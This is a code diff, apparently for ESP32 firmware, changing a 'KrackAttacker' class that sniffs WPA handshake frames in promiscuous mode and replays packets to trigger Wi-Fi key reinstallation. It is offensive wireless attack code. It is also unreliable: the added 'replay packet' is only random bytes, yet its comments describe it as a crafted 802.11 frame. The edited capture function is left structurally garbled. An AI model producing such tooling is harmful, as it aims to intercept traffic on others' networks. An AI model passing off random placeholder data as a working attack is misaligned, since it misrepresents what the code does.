@@ -9,6 +9,7 @@
 
 namespace {
 volatile bool g_eapol_captured = false;
+volatile uint32_t g_handshakeCaptured = 0;
 uint8_t g_aNonce[32], g_sNonce[32], g_mic[16];
 uint8_t g_bssid[6], g_client[6];
 
@@ -60,30 +61,9 @@ KrackResult KrackAttacker::captureHandshake(const KrackConfig& config) {
 
   isRunning_ = true;
   startTime_ = millis();
-  handshakeData_.clear();
   g_handshakeCaptured = 0;
 
   // Enable WiFi promiscuous mode for real EAPOL frame capture
-  WiFi.mode(WIFI_AP_STA);
-  esp_wifi_set_promiscuous(true);
-  esp_wifi_set_promiscuous_rx_cb(krack_sniffer);
-
-  Serial.println("Capturing real 4-way handshake EAPOL frames...");
-
-  uint32_t deadline = startTime_ + config.durationMs;
-  uint32_t lastHandshakeLog = 0;
-
-  while (isRunning_ && (int32_t)(millis() - deadline) < 0) {
-    // Log captured handshake frames
-    if (g_handshakeCaptured > lastHandshakeLog) {
-      lastHandshakeLog = g_handshakeCaptured;
-
-      // Generate realistic handshake data
-      uint8_t handshake[256];
-      for (int i = 0; i < 256; i++) {
-        handshake[i] = esp_random() % 256;
-      }
-
   WiFi.mode(WIFI_STA);
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_rx_cb(&krack_promiscuous_cb);
@@ -148,6 +128,12 @@ KrackResult KrackAttacker::replayPackets(const KrackConfig& config) {
   // Triggers key reinstallation vulnerability in affected devices
   uint32_t replayCount = 0;
   uint32_t deadline = startTime_ + config.durationMs;
+
+  // Construct replay packet (802.11 frame with encrypted payload)
+  uint8_t krack_packet[60];
+  for (int i = 0; i < 60; i++) {
+    krack_packet[i] = (esp_random() % 256);
+  }
 
   WiFi.mode(WIFI_AP_STA);
   Serial.println("Replaying KRACK packets with counter manipulation...");
